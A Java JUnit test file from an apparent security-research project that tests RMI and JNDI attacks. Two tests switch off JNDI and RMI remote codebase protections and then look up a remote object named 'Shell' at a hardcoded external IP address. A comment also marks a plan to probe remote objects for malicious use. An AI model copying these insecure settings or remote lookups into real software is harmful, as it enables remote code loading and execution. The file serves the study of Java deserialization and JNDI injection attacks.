package com.pinger.javasec;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.jupiter.api.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/3/30 16:14
 * RMI相关测试
 */
public class RmiTest {

    @Test
    public void test1() throws Exception{
        String[] list = Naming.list("rmi://127.0.0.1");
        ArrayList<Object> rmiObjs = new ArrayList<>();
        for (String s : list) {
            System.out.println(s);
            Remote current = Naming.lookup("rmi:" + s);
            rmiObjs.add(current);
        }
        rmiObjs.forEach(v->{
            // TODO:探测远程对象的方法，进行恶意操作
        });
    }


    @Test
    public void test2() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Context context = new InitialContext();
        Object object = context.lookup("rmi://49.234.105.98/Hello");
        System.out.println(object);
    }


    @Test
    public void test3() throws Exception{
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
//        Object object = Naming.lookup("rmi://49.234.105.98/Shell");

        LocateRegistry.getRegistry("49.234.105.98").lookup("Shell").getClass();
//        System.out.println(object);
    }










}
